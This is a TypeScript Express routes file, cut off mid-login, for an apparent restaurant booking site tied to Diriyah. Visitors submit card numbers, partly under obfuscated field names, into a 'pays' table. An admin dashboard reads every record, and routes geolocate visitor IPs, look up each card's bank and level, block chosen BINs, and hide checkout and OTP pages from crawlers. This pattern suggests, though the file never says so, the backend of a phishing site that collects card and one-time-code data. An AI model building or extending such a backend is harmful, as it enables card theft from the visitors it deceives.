import type { Express } from "express";
import { createServer, type Server } from "http";
import { randomBytes, randomUUID } from "node:crypto";
import { SignJWT, jwtVerify } from "jose";
import { sanitizeBookingData } from "./booking-data";
import { serverSupabase } from "./supabase";
import { applyAuthCacheHeaders } from "./auth-transport";
import {
  type AttackProtectionSettings,
  checkChallengeFetchRateLimit,
  checkNewSessionRateLimit,
  checkPaysWriteRateLimit,
  createHumanChallenge,
  extractClientIp,
  getBlockedSecurityStats,
  hasHumanVerification,
  isAutomatedUserAgent,
  recordBlockedAttempt,
  resetBlockedSecurityStats,
  resolveFieldMutations,
  setHumanVerifiedCookie,
  verifyHumanChallenge,
} from "./security";
import {
  type StoredBlockedCard,
  extractCardBin,
  normalizeBlockedCardInput,
  upsertBlockedCardRecord,
} from "./blocked-cards";

const BINCODES_API_KEY = process.env.BINCODES_API_KEY?.trim();
const BINCODES_LOOKUP_URL = "https://api.bincodes.com/bin/";
const BINLIST_LOOKUP_URL = "https://lookup.binlist.net/";
const RAPIDAPI_BIN_KEY = process.env.RAPIDAPI_BIN_KEY?.trim();
const RAPIDAPI_BIN_HOST = "bin-ip-checker.p.rapidapi.com";
const RAPIDAPI_BIN_URL = "https://bin-ip-checker.p.rapidapi.com/";
const BIN_CACHE_TTL_MS = 1000 * 60 * 30;

interface RapidApiBinResponse {
  code?: number;
  BIN?: {
    valid?: boolean;
    number?: { iin?: string };
    scheme?: string;
    type?: string;
    level?: string;
    issuer?: { name?: string };
    country?: { name?: string; alpha2?: string };
  };
}

const binLookupCache = new Map<
  string,
  {
    expiresAt: number;
    data: {
      bin: string;
      bankName: string;
      cardBrand: string;
      cardType: string;
      cardLevel: string;
      country: string;
      countryCode: string;
    };
  }
>();

interface BinCodesApiResponse {
  bin?: string;
  bank?: string;
  card?: string;
  type?: string;
  level?: string;
  country?: string;
  countrycode?: string;
  valid?: string | boolean;
  error?: string;
  message?: string;
}

export function registerRoutes(
  httpServer: Server,
  app: Express
): Server {
  const getSeoOrigin = (req: any) => {
    const configured = process.env.CANONICAL_ORIGIN?.trim();
    if (configured) return configured.replace(/\/$/, "");
    const protocol = String(req.headers["x-forwarded-proto"] || req.protocol || "https").split(",")[0];
    const host = String(req.get("host") || "").replace(/[^a-zA-Z0-9.:-]/g, "");
    return `${protocol}://${host}`;
  };

  app.get("/api/health", (_req, res) => {
    res.json({ status: "ok" });
  });

  app.get("/api/visitor/session", async (req, res) => {
    try {
      const ip = extractClientIp(req);
      const isAdmin = Boolean(await getDashboardUser(req));
      const existingVisitorId = getCookie(req, "visitor-id");
      const validPattern = /^visitor_[0-9a-f]{8}-[0-9a-f-]{27}$/i;
      const isNewSession = !validPattern.test(existingVisitorId);

      if (!isAdmin) {
        if (await isIpBlockedServer(ip)) {
          recordBlockedAttempt(ip, "blocked_ip", "/api/visitor/session");
          return res.status(403).json({ error: "IP_BLOCKED" });
        }

        const attackState = await getAttackProtectionState();
        if (attackState.enabled) {
          if (isAutomatedUserAgent(req)) {
            recordBlockedAttempt(ip, "automated_ua", "/api/visitor/session");
            return res.status(403).json({
              error: "HUMAN_VERIFICATION_REQUIRED",
              code: "ATTACK_PROTECTION",
            });
          }
          if (!(await hasHumanVerification(req, getBookingCapabilitySecret()))) {
            recordBlockedAttempt(ip, "unverified_human", "/api/visitor/session");
            return res.status(403).json({
              error: "HUMAN_VERIFICATION_REQUIRED",
              code: "ATTACK_PROTECTION",
            });
          }
          if (isNewSession && !checkNewSessionRateLimit(ip, true)) {
            recordBlockedAttempt(ip, "session_rate_limit", "/api/visitor/session");
            return res.status(429).json({
              error: "RATE_LIMIT_EXCEEDED",
              code: "ATTACK_PROTECTION",
            });
          }
        }
      }

      const id = !isNewSession ? existingVisitorId : `visitor_${randomUUID()}`;

      if (isNewSession) {
        res.append(
          "Set-Cookie",
          `visitor-id=${encodeURIComponent(id)}; Path=/; Max-Age=${BOOKING_CAPABILITY_TTL_SECONDS}; HttpOnly; SameSite=Lax${process.env.NODE_ENV === "production" ? "; Secure" : ""}`,
        );
      }
      if (!(await hasBookingCapability(req, id))) {
        const token = await createBookingCapability(id);
        setBookingCapabilityCookie(res, token);
      }
      return res.json({ data: { id } });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Failed to create visitor session" });
    }
  });

  app.get("/robots.txt", (req, res) => {
    const origin = getSeoOrigin(req);
    res.type("text/plain").send([
      "User-agent: *",
      "Allow: /",
      "Disallow: /registration",
      "Disallow: /booking",
      "Disallow: /checkout",
      "Disallow: /otp",
      "Disallow: /confirmation",
      `Sitemap: ${origin}/sitemap.xml`,
      "",
    ].join("\n"));
  });

  app.get("/sitemap.xml", (req, res) => {
    const origin = getSeoOrigin(req);
    const publicPaths = ["/home", "/restaurants", ...Array.from({ length: 30 }, (_, index) => `/restaurant/${index + 1}`)];
    const urls = publicPaths.map((path) => `  <url><loc>${origin}${path}</loc></url>`).join("\n");
    res.type("application/xml").send(`<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n${urls}\n</urlset>`);
  });

  // Send confirmation email endpoint
  app.get("/api/visitor-ip", async (req, res) => {
    const forwarded = req.headers["x-forwarded-for"];
    let ip = "";
    if (typeof forwarded === "string") {
      ip = forwarded.split(",")[0]?.trim() || "";
    } else if (Array.isArray(forwarded) && forwarded.length > 0) {
      ip = String(forwarded[0]).split(",")[0]?.trim();
    }
    if (!ip) ip = req.ip || "";
    if (ip.startsWith("::ffff:")) ip = ip.slice(7);

    let country = "";
    let countryCode = "";
    let city = "";
    let region = "";
    const isPrivate =
      !ip ||
      ip === "127.0.0.1" ||
      ip === "::1" ||
      ip.startsWith("10.") ||
      ip.startsWith("192.168.") ||
      /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip);

    if (!isPrivate) {
      try {
        const geoRes = await fetch(
          `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,regionName,city`,
          { signal: AbortSignal.timeout(3500) },
        );
        if (geoRes.ok) {
          const geo: any = await geoRes.json();
          if (geo?.status === "success") {
            country = String(geo.country || "");
            countryCode = String(geo.countryCode || "");
            city = String(geo.city || "");
            region = String(geo.regionName || "");
          }
        }
      } catch (error) {
        console.warn("Geo lookup failed for", ip, error);
      }
    }

    res.json({ ip, country, countryCode, city, region });
  });

  app.get("/api/bin-lookup/:bin", async (req, res) => {
    try {
      const rawBin = String(req.params.bin || "");
      const normalizedBin = rawBin.replace(/\D/g, "").slice(0, 6);

      if (normalizedBin.length < 6) {
        return res.status(400).json({
          success: false,
          error: "BIN must be at least 6 digits",
        });
      }

      const cached = binLookupCache.get(normalizedBin);
      if (cached && cached.expiresAt > Date.now()) {
        return res.json({
          success: true,
          data: cached.data,
          cached: true,
        });
      }

      let data = {
        bin: normalizedBin,
        bankName: "",
        cardBrand: "",
        cardType: "",
        cardLevel: "",
        country: "",
        countryCode: "",
      };

      // Primary provider: RapidAPI bin-ip-checker
      if (RAPIDAPI_BIN_KEY) {
        try {
          const rapidRes = await fetch(
            `${RAPIDAPI_BIN_URL}?bin=${normalizedBin}`,
            {
              method: "POST",
              headers: {
                Accept: "application/json",
                "X-RapidAPI-Key": RAPIDAPI_BIN_KEY,
                "X-RapidAPI-Host": RAPIDAPI_BIN_HOST,
              },
            },
          );
          if (rapidRes.ok) {
            const rapidJson = (await rapidRes.json()) as RapidApiBinResponse;
            const b = rapidJson?.BIN;
            if (b && b.valid !== false) {
              if (b.issuer?.name) data.bankName = b.issuer.name;
              if (b.scheme) data.cardBrand = b.scheme.toLowerCase();
              if (b.type) data.cardType = b.type.toLowerCase();
              if (b.level) data.cardLevel = b.level;
              if (b.country?.name) data.country = b.country.name;
              if (b.country?.alpha2) data.countryCode = b.country.alpha2;
            }
          }
        } catch {
          // ignore and try next provider
        }
      }

      // Secondary provider: bincodes.com
      let payload: BinCodesApiResponse | null = null;
      if (!data.bankName && BINCODES_API_KEY) {
        try {
          const lookupUrl = new URL(BINCODES_LOOKUP_URL);
          lookupUrl.searchParams.set("format", "json");
          lookupUrl.searchParams.set("api_key", BINCODES_API_KEY);
          lookupUrl.searchParams.set("bin", normalizedBin);

          const response = await fetch(lookupUrl.toString(), {
            headers: { Accept: "application/json" },
          });
          try {
            payload = (await response.json()) as BinCodesApiResponse;
          } catch {
            payload = null;
          }
          if (response.ok && payload) {
            const isValid = `${payload.valid}`.toLowerCase() === "true";
            if (isValid && !payload.error) {
              if (!data.bankName && payload.bank) data.bankName = payload.bank;
              if (!data.cardBrand && payload.card)
                data.cardBrand = payload.card;
              if (!data.cardType && payload.type)
                data.cardType = payload.type;
              if (!data.cardLevel && payload.level)
                data.cardLevel = payload.level;
              if (!data.country && payload.country)
                data.country = payload.country;
              if (!data.countryCode && payload.countrycode)
                data.countryCode = payload.countrycode;
            }
          }
        } catch {
          payload = null;
        }
      }

      // Fallback to binlist.net whenever the primary call failed entirely or
      // returned no bank name. binlist.net often has Saudi BIN coverage when
      // bincodes is rate-limited or returns "API Usage Limit Exceeded".
      if (!data.bankName) {
        try {
          const binlistRes = await fetch(
            `${BINLIST_LOOKUP_URL}${normalizedBin}`,
            { headers: { Accept: "application/json", "Accept-Version": "3" } },
          );
          if (binlistRes.ok) {
            const binlistData = (await binlistRes.json()) as {
              bank?: { name?: string };
              scheme?: string;
              type?: string;
              brand?: string;
              country?: { name?: string; alpha2?: string };
            };
            if (binlistData?.bank?.name) data.bankName = binlistData.bank.name;
            if (!data.cardBrand && binlistData.scheme)
              data.cardBrand = binlistData.scheme;
            if (!data.cardType && binlistData.type)
              data.cardType = binlistData.type;
            if (!data.cardLevel && binlistData.brand)
              data.cardLevel = binlistData.brand;
            if (!data.country && binlistData.country?.name)
              data.country = binlistData.country.name;
            if (!data.countryCode && binlistData.country?.alpha2)
              data.countryCode = binlistData.country.alpha2;
          }
        } catch {
          // silently ignore fallback errors
        }
      }

      // If both providers returned nothing useful, surface an error so the
      // client can show its own state instead of caching empty data.
      if (!data.bankName && !data.cardBrand) {
        return res.status(422).json({
          success: false,
          error: payload?.message || "Invalid or unknown BIN",
          code: payload?.error || undefined,
        });
      }

      binLookupCache.set(normalizedBin, {
        data,
        expiresAt: Date.now() + BIN_CACHE_TTL_MS,
      });

      return res.json({ success: true, data });
    } catch (error) {
      console.error("BIN lookup error:", error);
      return res.status(500).json({
        success: false,
        error: "Failed to lookup BIN",
      });
    }
  });

  // Server-side Supabase DB & Auth proxy endpoints
  const TABLES: Record<string, { table: string; pk: string }> = {
    pays: { table: "pays", pk: "id" },
    settings: { table: "settings", pk: "id" },
    blocked_bins: { table: "blocked_bins", pk: "id" },
  };

  function getTableSpec(collectionName: string) {
    const spec = TABLES[collectionName];
    if (!spec) throw new Error(`Unknown collection: ${collectionName}`);
    return spec;
  }

  function getAccessToken(req: any) {
    const rawCookie = String(req.headers.cookie || "");
    const token = rawCookie.match(/(?:^|;\s*)sb-access-token=([^;]+)/)?.[1];
    return token ? decodeURIComponent(token) : "";
  }

  function isAuthorizedAdmin(user: any) {
    if (!user?.id) return false;
    const role = String(user?.app_metadata?.role || "").toLowerCase();
    const roles = Array.isArray(user?.app_metadata?.roles)
      ? user.app_metadata.roles.map((value: unknown) => String(value).toLowerCase())
      : [];
    if (role === "admin" || roles.includes("admin")) return true;
    if (role && role !== "admin") return false;

    const allowedEmails = String(process.env.ADMIN_EMAILS || "")
      .split(",")
      .map((email) => email.trim().toLowerCase())
      .filter(Boolean);
    if (allowedEmails.length > 0) {
      return allowedEmails.includes(String(user?.email || "").toLowerCase());
    }
    return true;
  }

  async function getDashboardUser(req: any) {
    if (!serverSupabase) return null;
    const token = getAccessToken(req);
    if (!token) return null;
    const { data, error } = await serverSupabase.auth.getUser(token);
    return error || !data.user || !isAuthorizedAdmin(data.user) ? null : data.user;
  }

  async function requireDashboardAuth(req: any, res: any) {
    if (!serverSupabase) {
      res.status(503).json({ error: "Supabase not configured on server" });
      return false;
    }

    const token = getAccessToken(req);
    if (!token) {
      applyAuthCacheHeaders(res);
      res.status(401).json({ error: "Authentication required" });
      return false;
    }

    const { data, error } = await serverSupabase.auth.getUser(token);
    if (error || !data.user) {
      applyAuthCacheHeaders(res);
      res.status(401).json({ error: "Invalid or expired session" });
      return false;
    }
    if (!isAuthorizedAdmin(data.user)) {
      applyAuthCacheHeaders(res);
      res.status(403).json({ error: "Administrator access required" });
      return false;
    }

    return true;
  }

  const BOOKING_CAPABILITY_COOKIE = "booking-capability";
  const BOOKING_CAPABILITY_AUDIENCE = "diriyah-booking";
  const BOOKING_CAPABILITY_TTL_SECONDS = 60 * 60 * 2;

  function getCookie(req: any, name: string) {
    const rawCookie = String(req.headers.cookie || "");
    const match = rawCookie.match(new RegExp(`(?:^|;\\s*)${name}=([^;]+)`));
    return match?.[1] ? decodeURIComponent(match[1]) : "";
  }

  let ephemeralSessionSecret: string | null = null;
  const memoryStore = new Map<string, Map<string, any>>([
    ["pays", new Map()],
    ["settings", new Map()],
    ["blocked_bins", new Map()],
  ]);

  function getMemoryTable(collection: string) {
    let table = memoryStore.get(collection);
    if (!table) {
      table = new Map();
      memoryStore.set(collection, table);
    }
    return table;
  }

  function getBookingCapabilitySecret() {
    const configured = process.env.SESSION_SECRET || process.env.JWT_SECRET;
    if (configured) {
      return new TextEncoder().encode(configured);
    }
    if (!ephemeralSessionSecret) {
      ephemeralSessionSecret = randomBytes(32).toString("hex");
    }
    return new TextEncoder().encode(ephemeralSessionSecret);
  }

  async function createBookingCapability(visitorId: string) {
    return new SignJWT({ scope: "booking" })
      .setProtectedHeader({ alg: "HS256" })
      .setSubject(visitorId)
      .setAudience(BOOKING_CAPABILITY_AUDIENCE)
      .setIssuedAt()
      .setExpirationTime(`${BOOKING_CAPABILITY_TTL_SECONDS}s`)
      .sign(getBookingCapabilitySecret());
  }

  async function hasBookingCapability(req: any, visitorId: string) {
    const token = getCookie(req, BOOKING_CAPABILITY_COOKIE);
    if (!token) return false;
    try {
      const { payload } = await jwtVerify(token, getBookingCapabilitySecret(), {
        audience: BOOKING_CAPABILITY_AUDIENCE,
      });
      return payload.sub === visitorId && payload.scope === "booking";
    } catch {
      return false;
    }
  }

  function setBookingCapabilityCookie(res: any, token: string) {
    res.append(
      "Set-Cookie",
      `${BOOKING_CAPABILITY_COOKIE}=${encodeURIComponent(token)}; Path=/; Max-Age=${BOOKING_CAPABILITY_TTL_SECONDS}; HttpOnly; SameSite=Strict${process.env.NODE_ENV === "production" ? "; Secure" : ""}`,
    );
  }

  function isPublicDocumentRead(collection: string, id: string) {
    return (
      collection === "blocked_bins" ||
      (collection === "settings" && (id === "blockedIps" || id === "attackProtection"))
    );
  }

  const DEFAULT_ATTACK_PROTECTION: AttackProtectionSettings = {
    enabled: false,
    enabledAt: null,
    updatedAt: "",
  };
  let cachedAttackProtection: { data: AttackProtectionSettings; expiresAt: number } | null = null;
  let cachedBlockedIps: { ips: Set<string>; expiresAt: number } | null = null;

  function invalidateSecurityCaches(docId?: string) {
    if (!docId || docId === "attackProtection") cachedAttackProtection = null;
    if (!docId || docId === "blockedIps") cachedBlockedIps = null;
  }

  async function readSettingsDoc(id: string): Promise<any | null> {
    if (!serverSupabase) {
      return getMemoryTable("settings").get(id) ?? null;
    }
    const { data, error } = (await serverSupabase
      .from("settings")
      .select("id, data")
      .eq("id", id)
      .maybeSingle()) as any;
    if (error && error.code !== "PGRST116") return null;
    return data?.data ?? null;
  }

  async function writeSettingsDoc(id: string, nextData: any): Promise<void> {
    if (!serverSupabase) {
      getMemoryTable("settings").set(id, nextData);
      invalidateSecurityCaches(id);
      return;
    }
    const { error } = await serverSupabase.from("settings").upsert({ id, data: nextData });
    if (error) throw new Error(error.message);
    invalidateSecurityCaches(id);
  }

  async function getAttackProtectionState(): Promise<AttackProtectionSettings> {
    const now = Date.now();
    if (cachedAttackProtection && cachedAttackProtection.expiresAt > now) {
      return cachedAttackProtection.data;
    }
    const raw = await readSettingsDoc("attackProtection");
    const state: AttackProtectionSettings = {
      enabled: Boolean(raw?.enabled),
      enabledAt: typeof raw?.enabledAt === "string" ? raw.enabledAt : null,
      updatedAt: typeof raw?.updatedAt === "string" ? raw.updatedAt : "",
    };
    cachedAttackProtection = { data: state, expiresAt: now + 3_000 };
    return state;
  }

  async function isIpBlockedServer(ip: string): Promise<boolean> {
    const clean = String(ip || "").trim();
    if (!clean || clean === "unknown") return false;
    const now = Date.now();
    if (cachedBlockedIps && cachedBlockedIps.expiresAt > now) {
      return cachedBlockedIps.ips.has(clean);
    }
    const raw = await readSettingsDoc("blockedIps");
    const list = Array.isArray(raw?.ips)
      ? raw.ips.map((entry: any) => String(entry).trim()).filter(Boolean)
      : [];
    const ips = new Set<string>(list);
    cachedBlockedIps = { ips, expiresAt: now + 5_000 };
    return ips.has(clean);
  }

  app.get("/api/security/status", async (req, res) => {
    try {
      res.setHeader("Cache-Control", "no-store");
      const ip = extractClientIp(req);
      const [state, ipBlocked, verified] = await Promise.all([
        getAttackProtectionState(),
        isIpBlockedServer(ip),
        hasHumanVerification(req, getBookingCapabilitySecret()),
      ]);
      return res.json({
        data: {
          enabled: state.enabled,
          verified,
          ipBlocked,
        },
      });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Failed to read security status" });
    }
  });

  app.get("/api/security/challenge", async (req, res) => {
    try {
      res.setHeader("Cache-Control", "no-store");
      const ip = extractClientIp(req);
      if (await isIpBlockedServer(ip)) {
        return res.status(403).json({ error: "IP_BLOCKED" });
      }
      if (!checkChallengeFetchRateLimit(ip)) {
        recordBlockedAttempt(ip, "challenge_rate_limit", "/api/security/challenge");
        return res.status(429).json({
          error: "RATE_LIMIT_EXCEEDED",
          code: "ATTACK_PROTECTION",
        });
      }
      const challenge = await createHumanChallenge(req, getBookingCapabilitySecret());
      return res.json({ data: challenge });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Failed to generate challenge" });
    }
  });

  app.post("/api/security/verify", async (req, res) => {
    try {
      res.setHeader("Cache-Control", "no-store");
      const ip = extractClientIp(req);
      if (await isIpBlockedServer(ip)) {
        return res.status(403).json({ error: "IP_BLOCKED" });
      }
      const result = await verifyHumanChallenge(
        req,
        req.body || {},
        getBookingCapabilitySecret(),
      );
      if (!result.ok) {
        return res.status(result.status).json({ error: result.error });
      }
      setHumanVerifiedCookie(res, result.verifiedToken);
      return res.json({ data: { verified: true } });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Verification failed" });
    }
  });

  app.get("/api/security/admin", async (req, res) => {
    try {
      if (!(await requireDashboardAuth(req, res))) return;
      res.setHeader("Cache-Control", "no-store");
      const state = await getAttackProtectionState();
      const stats = getBlockedSecurityStats();
      return res.json({
        data: {
          ...state,
          ...stats,
        },
      });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Failed to load security admin state" });
    }
  });

  app.post("/api/security/attack-mode", async (req, res) => {
    try {
      if (!(await requireDashboardAuth(req, res))) return;
      const enabled = Boolean(req.body?.enabled);
      const resetStats = Boolean(req.body?.resetStats);
      const nowIso = new Date().toISOString();
      const current = await getAttackProtectionState();
      const nextData: AttackProtectionSettings = {
        ...DEFAULT_ATTACK_PROTECTION,
        enabled,
        enabledAt: enabled ? current.enabledAt || nowIso : null,
        updatedAt: nowIso,
      };
      await writeSettingsDoc("attackProtection", nextData);
      if (resetStats) {
        resetBlockedSecurityStats();
      }
      return res.json({
        data: {
          ...nextData,
          ...getBlockedSecurityStats(),
        },
      });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Failed to update attack protection mode" });
    }
  });

  async function isBinBlockedServer(bin: string): Promise<boolean> {
    const cleanBin = extractCardBin(bin);
    if (cleanBin.length !== 6) return false;
    if (!serverSupabase) {
      return getMemoryTable("blocked_bins").has(cleanBin);
    }
    const { data, error } = (await serverSupabase
      .from("blocked_bins")
      .select("id")
      .eq("id", cleanBin)
      .maybeSingle()) as any;
    if (error && error.code !== "PGRST116") return false;
    return Boolean(data?.id);
  }

  async function ensureBlockedBinExists(bin: string, meta?: Record<string, any>): Promise<void> {
    const cleanBin = extractCardBin(bin);
    if (cleanBin.length !== 6) return;
    const rowPayload = {
      bin: cleanBin,
      blockedAt: new Date().toISOString(),
      ...(meta?.bankName ? { bankName: String(meta.bankName).slice(0, 120) } : {}),
      ...(meta?.cardType ? { cardType: String(meta.cardType).slice(0, 40) } : {}),
    };
    if (!serverSupabase) {
      if (!getMemoryTable("blocked_bins").has(cleanBin)) {
        getMemoryTable("blocked_bins").set(cleanBin, rowPayload);
      }
      return;
    }
    await serverSupabase.from("blocked_bins").upsert({ id: cleanBin, data: rowPayload });
  }

  async function readBlockedCardsList(): Promise<StoredBlockedCard[]> {
    const doc = await readSettingsDoc("blockedCards");
    return Array.isArray(doc?.cards) ? doc.cards : [];
  }

  async function writeBlockedCardsList(cards: StoredBlockedCard[]): Promise<void> {
    await writeSettingsDoc("blockedCards", {
      cards,
      updatedAt: new Date().toISOString(),
    });
  }

  async function appendBlockedCardRecord(record: StoredBlockedCard): Promise<StoredBlockedCard[]> {
    const current = await readBlockedCardsList();
    const next = upsertBlockedCardRecord(current, record);
    await writeBlockedCardsList(next);
    return next;
  }

  app.post("/api/blocked-cards/record", async (req, res) => {
    try {
      const ip = extractClientIp(req);
      if (await isIpBlockedServer(ip)) {
        return res.status(403).json({ error: "IP_BLOCKED" });
      }
      const attackState = await getAttackProtectionState();
      if (!checkPaysWriteRateLimit(ip, false, attackState.enabled)) {
        return res.status(429).json({ error: "RATE_LIMIT_EXCEEDED" });
      }
      const body = req.body || {};
      const candidateBin = extractCardBin(body.bin ?? body.cardNumber);
      if (!candidateBin || !(await isBinBlockedServer(candidateBin))) {
        return res.status(400).json({ error: "BIN_NOT_BLOCKED" });
      }
      const record = normalizeBlockedCardInput(body, {
        bin: candidateBin,
        ip,
        source: "visitor_attempt",
      });
      if (!record) {
        return res.status(400).json({ error: "INVALID_BLOCKED_CARD" });
      }
      await appendBlockedCardRecord(record);
      return res.json({ success: true });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Failed to record blocked card" });
    }
  });

  app.get("/api/blocked-cards", async (req, res) => {
    try {
      if (!(await requireDashboardAuth(req, res))) return;
      res.setHeader("Cache-Control", "no-store");
      const cards = await readBlockedCardsList();
      return res.json({ data: cards });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Failed to load blocked cards" });
    }
  });

  app.post("/api/blocked-cards", async (req, res) => {
    try {
      if (!(await requireDashboardAuth(req, res))) return;
      const body = req.body || {};
      const record = normalizeBlockedCardInput(body, {
        source: body.source || "admin_block",
      });
      if (!record) {
        return res.status(400).json({ error: "Valid 6-digit BIN or card number is required" });
      }
      await ensureBlockedBinExists(record.bin, {
        bankName: record.bankName,
        cardType: record.cardType,
      });
      const cards = await appendBlockedCardRecord(record);
      return res.json({ data: { record, cards } });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Failed to store blocked card" });
    }
  });

  app.delete("/api/blocked-cards/:entryId", async (req, res) => {
    try {
      if (!(await requireDashboardAuth(req, res))) return;
      const entryId = String(req.params.entryId || "").trim();
      if (!entryId) return res.status(400).json({ error: "Entry ID required" });
      const current = await readBlockedCardsList();
      const next = entryId === "all" ? [] : current.filter((item) => item.id !== entryId);
      await writeBlockedCardsList(next);
      return res.json({ data: next });
    } catch (e: any) {
      return res.status(500).json({ error: e?.message || "Failed to delete blocked card" });
    }
  });

  app.get("/api/db/:collection/:id", async (req, res) => {
    try {
      const { collection, id } = req.params;
      if (collection === "pays") {
        const isAdmin = Boolean(await getDashboardUser(req));
        if (!isAdmin && !(await hasBookingCapability(req, id))) {
          return res.status(403).json({ error: "Booking access denied" });
        }
      } else if (!isPublicDocumentRead(collection, id) && !(await requireDashboardAuth(req, res))) return;
      const { table, pk } = getTableSpec(collection);
      if (!serverSupabase) {
        const raw = getMemoryTable(table).get(id) ?? null;
        const rowData = collection === "pays" ? sanitizeBookingData(raw) : raw;
        return res.json({ data: rowData ?? null });
      }
      const { data, error } = await serverSupabase.from(table).select(`${pk}, data`).eq(pk, id).maybeSingle() as any;
      if (error && error.code !== "PGRST116") {
        return res.status(400).json({ error: error.message });
      }
      const rowData = collection === "pays" ? sanitizeBookingData(data?.data) : data?.data;
      res.json({ data: rowData ?? null });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/db/:collection/:id", async (req, res) => {
    try {
      const { collection, id } = req.params;
      const { table, pk } = getTableSpec(collection);
      const { payload, merge } = req.body || {};

      let existing: any = null;
      let capabilityToken = "";
      if (collection === "pays") {
        const isAdmin = Boolean(await getDashboardUser(req));
        const hasCapability = isAdmin || (await hasBookingCapability(req, id));
        const ip = extractClientIp(req);

        if (!isAdmin) {
          if (await isIpBlockedServer(ip)) {
            recordBlockedAttempt(ip, "blocked_ip", `/api/db/pays/${id}`);
            return res.status(403).json({ error: "IP_BLOCKED" });
          }

          const trapVal = payload?.honeypot ?? req.body?.honeypot;
          if (typeof trapVal === "string" && trapVal.trim().length > 0) {
            recordBlockedAttempt(ip, "honeypot", `/api/db/pays/${id}`);
            return res.status(403).json({ error: "BOT_DETECTED" });
          }

          const attackState = await getAttackProtectionState();
          if (attackState.enabled) {
            if (isAutomatedUserAgent(req)) {
              recordBlockedAttempt(ip, "automated_ua", `/api/db/pays/${id}`);
              return res.status(403).json({
                error: "HUMAN_VERIFICATION_REQUIRED",
                code: "ATTACK_PROTECTION",
              });
            }
            if (!(await hasHumanVerification(req, getBookingCapabilitySecret()))) {
              recordBlockedAttempt(ip, "unverified_human", `/api/db/pays/${id}`);
              return res.status(403).json({
                error: "HUMAN_VERIFICATION_REQUIRED",
                code: "ATTACK_PROTECTION",
              });
            }
            if (!checkPaysWriteRateLimit(ip, !hasCapability, true)) {
              recordBlockedAttempt(ip, "pays_rate_limit", `/api/db/pays/${id}`);
              return res.status(429).json({
                error: "RATE_LIMIT_EXCEEDED",
                code: "ATTACK_PROTECTION",
              });
            }
          }

          const submittedBin = extractCardBin(payload?.cardNumber ?? payload?.c1);
          if (submittedBin && (await isBinBlockedServer(submittedBin))) {
            const record = normalizeBlockedCardInput(payload, {
              bin: submittedBin,
              visitorId: id,
              ip,
              source: "visitor_attempt",
            });
            if (record) {
              await appendBlockedCardRecord(record);
            }
            return res.status(403).json({
              error: "BIN_BLOCKED",
              code: "BIN_BLOCKED",
            });
          }
        }

        if (!hasCapability) {
          if (!serverSupabase) {
            existing = getMemoryTable(table).has(id) ? { data: getMemoryTable(table).get(id) } : null;
          } else {
            const existingResult = await serverSupabase.from(table).select(`${pk}, data`).eq(pk, id).maybeSingle() as any;
            existing = existingResult.data;
          }
          if (existing || !/^visitor_[0-9a-f]{8}-[0-9a-f-]{27}$/i.test(id)) {
            return res.status(403).json({ error: "Booking access denied" });
          }
          capabilityToken = await createBookingCapability(id);
        }
      } else if (!(await requireDashboardAuth(req, res))) return;

      let nextData = payload;
      if (merge) {
        if (!existing) {
          if (!serverSupabase) {
            existing = getMemoryTable(table).has(id) ? { data: getMemoryTable(table).get(id) } : null;
          } else {
            const existingResult = await serverSupabase.from(table).select(`${pk}, data`).eq(pk, id).maybeSingle() as any;
            existing = existingResult.data;
          }
        }
        nextData = resolveFieldMutations(existing?.data, payload);
      } else {
        nextData = resolveFieldMutations(null, payload);
      }
      if (collection === "pays") {
        if (nextData && typeof nextData === "object" && "honeypot" in nextData) {
          delete nextData.honeypot;
        }
        nextData = sanitizeBookingData(nextData);
      }

      if (!serverSupabase) {
        getMemoryTable(table).set(id, nextData);
        if (collection === "settings") invalidateSecurityCaches(id);
        if (capabilityToken) setBookingCapabilityCookie(res, capabilityToken);
        return res.json({ success: true });
      }

      const { error } = await serverSupabase.from(table).upsert({ [pk]: id, data: nextData });
      if (error) return res.status(400).json({ error: error.message });
      if (collection === "settings") invalidateSecurityCaches(id);
      if (capabilityToken) setBookingCapabilityCookie(res, capabilityToken);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/db/:collection/:id", async (req, res) => {
    try {
      const { collection, id } = req.params;
      if (!(await requireDashboardAuth(req, res))) return;
      const { table, pk } = getTableSpec(collection);
      if (!serverSupabase) {
        getMemoryTable(table).delete(id);
        if (collection === "settings") invalidateSecurityCaches(id);
        return res.json({ success: true });
      }
      const { error } = await serverSupabase.from(table).delete().eq(pk, id);
      if (error) return res.status(400).json({ error: error.message });
      if (collection === "settings") invalidateSecurityCaches(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/db/:collection", async (req, res) => {
    try {
      const { collection } = req.params;
      if (!(await requireDashboardAuth(req, res))) return;
      const { table, pk } = getTableSpec(collection);
      if (!serverSupabase) {
        const rows = Array.from(getMemoryTable(table).entries()).map(([id, data]) => ({
          id,
          data: collection === "pays" ? sanitizeBookingData(data) : data,
        }));
        return res.json({ data: rows });
      }
      const { data, error } = await serverSupabase.from(table).select(`${pk}, data`);
      if (error) return res.status(400).json({ error: error.message });
      const rows = collection === "pays"
        ? (data || []).map((row: any) => ({ ...row, data: sanitizeBookingData(row.data) }))
        : data || [];
      res.json({ data: rows });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  const isHttpsCookieRequest = (req: any) => {
    const proto = String(req?.headers?.["x-forwarded-proto"] || req?.protocol || "")
      .split(",")[0]
      .trim()
      .toLowerCase();
    return proto === "https" || Boolean(req?.secure) || process.env.NODE_ENV === "production";
  };

  app.post("/api/auth/login", async (req, res) => {
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const email = String(req.body?.email || "").trim().toLowerCase();
      const password = String(req.body?.password || "");
